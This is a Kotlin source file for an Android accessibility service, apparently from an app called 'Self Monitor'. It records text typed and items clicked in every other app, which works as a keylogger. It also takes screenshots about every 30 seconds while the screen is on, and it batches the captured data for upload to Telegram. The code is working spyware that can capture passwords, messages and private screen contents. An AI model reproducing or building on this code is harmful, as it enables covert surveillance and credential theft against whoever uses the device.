package com.example.phuonguyen

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.graphics.Bitmap
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.Executors

class MonitorAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "SelfMonitorAcc"
        var isRunning: Boolean = false
    }

    private lateinit var dbHelper: DbHelper
    private val syncHandler = Handler(Looper.getMainLooper())
    private val screenshotHandler = Handler(Looper.getMainLooper())
    private val screenshotExecutor = Executors.newSingleThreadExecutor()

    private var isSyncScheduled = false
    private val syncRunnable = Runnable {
        isSyncScheduled = false
        TelegramSender.syncPendingData(applicationContext)
    }

    private var autoScreenshotIntervalMillis = 30_000L
    private val autoScreenshotRunnable = object : Runnable {
        override fun run() {
            if (isRunning) {
                // Nếu ScreenshotService đang chạy MediaProjection thì ưu tiên nó, không chụp đè
                if (!ScreenshotService.isRunning) {
                    captureScreenViaAccessibility()
                }
            }
            screenshotHandler.postDelayed(this, autoScreenshotIntervalMillis)
        }
    }

    private fun scheduleTextSync() {
        if (!isSyncScheduled) {
            isSyncScheduled = true
            // Gom nội dung gõ phím trong 20 giây rồi gửi theo đợt lên Telegram
            syncHandler.postDelayed(syncRunnable, 20_000L)
        }
    }

    override fun onCreate() {
        super.onCreate()
        dbHelper = DbHelper(this)
        Log.d(TAG, "MonitorAccessibilityService onCreate")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        isRunning = true
        Log.d(TAG, "MonitorAccessibilityService onServiceConnected")

        try {
            val info = serviceInfo ?: AccessibilityServiceInfo()
            info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED or
                    AccessibilityEvent.TYPE_VIEW_FOCUSED or
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            info.notificationTimeout = 100
            info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            serviceInfo = info
        } catch (e: Exception) {
            Log.e(TAG, "Error configuring serviceInfo", e)
        }

        // Bắt đầu tự động chụp màn hình nền định kỳ qua Accessibility (Android 11+)
        screenshotHandler.removeCallbacks(autoScreenshotRunnable)
        screenshotHandler.postDelayed(autoScreenshotRunnable, 2500L)
    }

    private fun captureScreenViaAccessibility() {
        // Chỉ chụp khi màn hình đang sáng (người dùng đang mở máy)
        val powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager
        if (powerManager?.isInteractive == false) {
            return
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                takeScreenshot(
                    Display.DEFAULT_DISPLAY,
                    screenshotExecutor,
                    object : TakeScreenshotCallback {
                        override fun onSuccess(screenshotResult: ScreenshotResult) {
                            val hardwareBuffer = screenshotResult.hardwareBuffer
                            try {
                                val colorSpace = screenshotResult.colorSpace
                                val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                                if (bitmap != null) {
                                    val softwareBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, false)
                                    if (softwareBitmap != null) {
                                        // Kiểm tra nếu là màn hình đen xì thì bỏ qua luôn, không lưu file, không gửi
                                        if (TelegramSender.isPureBlackBitmap(softwareBitmap)) {
                                            Log.d(TAG, "Accessibility frame is pure black (screen off). Discarding.")
                                            softwareBitmap.recycle()
                                            bitmap.recycle()
                                            return
                                        }

                                        val dir = File(filesDir, "screenshots")
                                        if (!dir.exists()) dir.mkdirs()
                                        val file = File(dir, "shot_${System.currentTimeMillis()}.jpg")
                                        FileOutputStream(file).use { out ->
                                            softwareBitmap.compress(Bitmap.CompressFormat.JPEG, 75, out)
                                        }
                                        softwareBitmap.recycle()
                                        bitmap.recycle()

                                        Log.d(TAG, "Auto-captured screenshot via Accessibility: ${file.absolutePath} (${file.length()} bytes)")
                                        dbHelper.insertScreenshot(file.absolutePath)
                                        TelegramSender.syncPendingData(applicationContext)
                                    } else {
                                        bitmap.recycle()
                                    }
                                }
                            } catch (e: Exception) {
                                Log.e(TAG, "Error saving accessibility screenshot", e)
                            } finally {
                                hardwareBuffer.close()
                            }
                        }

                        override fun onFailure(errorCode: Int) {
                            Log.w(TAG, "Accessibility takeScreenshot failed with code $errorCode")
                        }
                    }
                )
            } catch (e: Exception) {
                Log.e(TAG, "Exception calling takeScreenshot", e)
            }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val pkg = event.packageName?.toString() ?: ""
        // Bỏ qua nếu là sự kiện phát sinh từ chính ứng dụng Self Monitor
        if (pkg.isEmpty() || pkg == packageName) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val texts = event.text
                val sb = StringBuilder()
                if (!texts.isNullOrEmpty()) {
                    for (t in texts) {
                        if (!t.isNullOrBlank()) {
                            sb.append(t).append(" ")
                        }
                    }
                }
                if (sb.isBlank()) {
                    val src = event.source
                    val srcText = src?.text?.toString()
                    if (!srcText.isNullOrBlank()) {
                        sb.append(srcText)
                    }
                }
                val content = sb.toString().trim()
                if (content.isNotEmpty()) {
                    Log.d(TAG, "Captured text from [$pkg]: $content")
                    dbHelper.insertTextLog(pkg, content)
                    scheduleTextSync()
                }
            }

            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val text = event.text.joinToString(" ") { it.toString() }.trim()
                val desc = event.contentDescription?.toString()?.trim() ?: ""
                val clickedItem = if (text.isNotEmpty()) text else desc
                if (clickedItem.isNotEmpty()) {
                    Log.d(TAG, "Captured click from [$pkg]: $clickedItem")
                    dbHelper.insertTextLog(pkg, "[Click] $clickedItem")
                    scheduleTextSync()
                }
            }
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "MonitorAccessibilityService onInterrupt")
    }

    override fun onDestroy() {
        super.onDestroy()
        syncHandler.removeCallbacks(syncRunnable)
        screenshotHandler.removeCallbacks(autoScreenshotRunnable)
        isRunning = false
        Log.d(TAG, "MonitorAccessibilityService onDestroy")
    }
}
